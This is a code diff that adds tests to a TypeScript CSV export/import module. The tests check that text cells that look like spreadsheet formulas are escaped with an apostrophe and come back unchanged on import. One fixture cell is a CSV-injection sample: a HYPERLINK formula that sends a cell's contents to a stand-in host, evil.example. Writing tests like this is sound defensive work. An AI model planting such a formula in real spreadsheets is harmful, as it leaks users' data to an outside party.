@@ -153,6 +153,50 @@ describe("the csv round trip", () => {
 
     expect(cellText(parsed.rows[2]?.[2] ?? null)).toBe('Cuadro, "principal"');
   });
+
+  const formulas: ExchangeSheet = {
+    sheetName: "Tareas",
+    indentColumn: 1,
+    columns: [
+      { header: "Título", kind: "text" },
+      { header: "Estimación (h)", kind: "number" },
+    ],
+    rows: [
+      {
+        cells: ['=HYPERLINK("http://evil.example/?d="&A1)', -5],
+        outlineLevel: 0,
+      },
+      { cells: ["+34 600 000 000", null], outlineLevel: 0 },
+      { cells: ["-coste de material", null], outlineLevel: 0 },
+      { cells: ["@SUM(A1:A9)", null], outlineLevel: 0 },
+      { cells: ["\tTabulado", null], outlineLevel: 0 },
+    ],
+  };
+
+  it("never lets a text cell run as a formula when Excel opens it", () => {
+    const lines = buildExchangeCsv(formulas).toString("utf8").split("\r\n");
+
+    expect(lines[1]).toBe(`"'=HYPERLINK(""http://evil.example/?d=""&A1)",-5`);
+    expect(lines[2]).toBe("'+34 600 000 000,");
+    expect(lines[3]).toBe("'-coste de material,");
+    expect(lines[4]).toBe("'@SUM(A1:A9),");
+    expect(lines[5]).toBe("'\tTabulado,");
+  });
+
+  it("reads formula-looking text back exactly as it was written", async () => {
+    const parsed = await parseUploadedFile(buildExchangeCsv(formulas), "t.csv");
+
+    expect(parsed.rows.map((row) => cellText(row[0]))).toEqual([
+      '=HYPERLINK("http://evil.example/?d="&A1)',
+      "+34 600 000 000",
+      "-coste de material",
+      "@SUM(A1:A9)",
+      // El importador recorta los extremos de toda celda; lo que importa es
+      // que el apostrofo no sobreviva.
+      "Tabulado",
+    ]);
+    expect(cellText(parsed.rows[0]?.[1] ?? null)).toBe("-5");
+  });
 });
 
 describe("parseUploadedFile", () => {
